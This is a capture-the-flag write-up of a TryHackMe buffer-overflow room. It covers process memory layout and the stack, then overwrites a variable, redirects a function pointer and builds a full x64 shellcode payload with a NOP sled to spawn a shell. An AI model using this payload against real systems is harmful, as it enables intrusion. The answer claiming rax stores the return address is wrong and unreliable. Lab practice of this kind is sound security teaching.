```
                                       )                                              
   (        (     (                 ( /(                    (     (                   
 ( )\    (  )\ )  )\ )    (   (     )\())   )      (   (    )\ )  )\      (  (        
 )((_)  ))\(()/( (()/(   ))\  )(   ((_)\   /((    ))\  )(  (()/( ((_) (   )\))(   (   
((_)_  /((_)/(_)) /(_)) /((_)(()\    ((_) (_))\  /((_)(()\  /(_)) _   )\ ((_)()\  )\  
 | _ )(_))((_) _|(_) _|(_))   ((_)  / _ \ _)((_)(_))   ((_)(_) _|| | ((_)_(()((_)((_) 
 | _ \| || ||  _| |  _|/ -_) | '_| | (_) |\ V / / -_) | '_| |  _|| |/ _ \\ V  V /(_-< 
 |___/ \_,_||_|   |_|  \___| |_|    \___/  \_/  \___| |_|   |_|  |_|\___/ \_/\_/ /__/ 
```
In this THM room, we learn how to get started with basic Buffer Overflows. [^1]

Task 1 - Introduction
-----------------------------------------------------------------------------------------
We access the target machine via SSH with the user *user1* and the password 
*user1password* on our attacking machine. After being connected, to the *Amazon Linux 2
AMI* machine, we can promptly check if `radare2` is installed on the system.

Task 2 - Process Layout
-----------------------------------------------------------------------------------------
**Where is dynamically allocated memory stored?**

The *heap* increases and decreases dynamically depending on whether a program dynamically
assigns memory.
```
+------------------------+ higher memory addresses [bottom of the stack]
| user stack (downwards) | -> information about functions and local arguments
|________________________| lower memory addresses [top of the stack]
|                        |
| shared library regions | -> statically or dynamically link libraries
|________________________|
|                        |
| runtime heap (upwards) | -> dynamically allocated memory is stored here
|________________________|
| read / write data      |
|________________________|
| read only code / data  | -> program executable and initialised variables
+------------------------+ 0
```
**Where is information about functions (e.g. local arguments) stored?**

The user "stack" contains the information required to run the program. This
information would include the current program counter, saved registers. Notice,
that the stack grows downwards towards the heap from higher to lower addresses.

[Flag 03] In what direction does the stack grow (l for lower/h for higher)?
It grows from higher to "lower" memory addresses.

[Flag 04] What instruction is used to add data onto the stack?
The "push" instruction is used to add data onto the stack, whereas popping is
used to remove data from the stack. It is important to note that the memory does
not change when popping values of the stack as it is only the value of the stack
pointer that changes.

[Flag 05] What register stores the return address?
The "rax" register stores the return values of the functions (if there are any).

[Flag 06] What is the minimum number of characters needed to overwrite the var?
The variable is located directly next to the buffer with a size of 14 characters
and it would thus require > 14, so 15 characters to overwrite the variable. And
indeed, we try this out with the input "012345678901234" to change the value.

[Flag 07] Invoke the special function() in the overflow-2 folder.
First, find out the address of <special> with `objdump -d func-pointer` to be
"0000000000400567" which can be translated to 0x67054000 in little endian. So,
we want to pass 14 characters to provoke the buffer overflow followed by the
address specification `\x67\x05\x40\x00` to call the special() function. Since,
providing the ASCII code would be nasty, we use `echo` to then pipe the result:

$ echo -e "01234567890123\x67\x05\x40\x00" | ./func-pointer
this is the special function
you did this, friend!

[Flag 08] Open a shell and read the contents of the secret file in overflow-3.

1. Find out the offset, i.e. the address of the start of the buffer and start
   address of the return address. Then, calculate the difference between these
   addresses to know how much data must be padded to achieve the offset length.
Because we have access to the source code, we know that the buffer is at least
140 bytes long. But between the 140th byte and the return address, there is a
gap filled with some "alignment bytes" and rbp register length (8 bytes in x64
architectures). To get the exact offset, we fill the buffer with the letter 'A'
(\x41 in hexadecimal) until we start to see the A's overwriting the return
address in `gdb ./buffer-overflow` and since the return address must be 6 must
be 6 bytes long, we aim at getting the return address "0x0000414141414141". And
indeed, after some iterations, we find out that the offset must be 158 - 6 = 152
characters long: (gdb) run $(python -c "print('A'*158)")

2. Pick a shell code to put in the buffer and have the return address point to.
By relying on the Exploit Database and searching for "Linux/x64 Shellcode", we
are able to get this shellcode "\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69
\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05
\x6a\x3c\x58\x48\x31\xff\x0f\x05" with an exit call at the end to prevent SIGILL
errors. Finally, the payload is of the following format:

[PAYLOAD] = [JUNK (100 bytes)] + [SHELL CODE (40 bytes)] + [JUNK (12 bytes)] +
    [RETURN ADDRESS (6 bytes)]

Notice, that we fill the junk with NOPs in the beginning before the shellcode
because they will get skipped if the memory shifts a bit and the exploit will
still work. The address where the shell code starts can be obtained with `gdb`.

$ ./buffer-overflow $(python -c "print '\x90' * 100 + '\x6a\x3b\x58\x48\x31\xd2\
    x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\
    x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A' * 12 + '\
    x98\xe2\xff\xff\xff\x7f'")

This walkthrough solution based on: https://l1ge.github.io/tryhackme_bof1/

[Flag 09] Use the same method to read the contents of the secret file!

[^1]: https://tryhackme.com/room/bof1
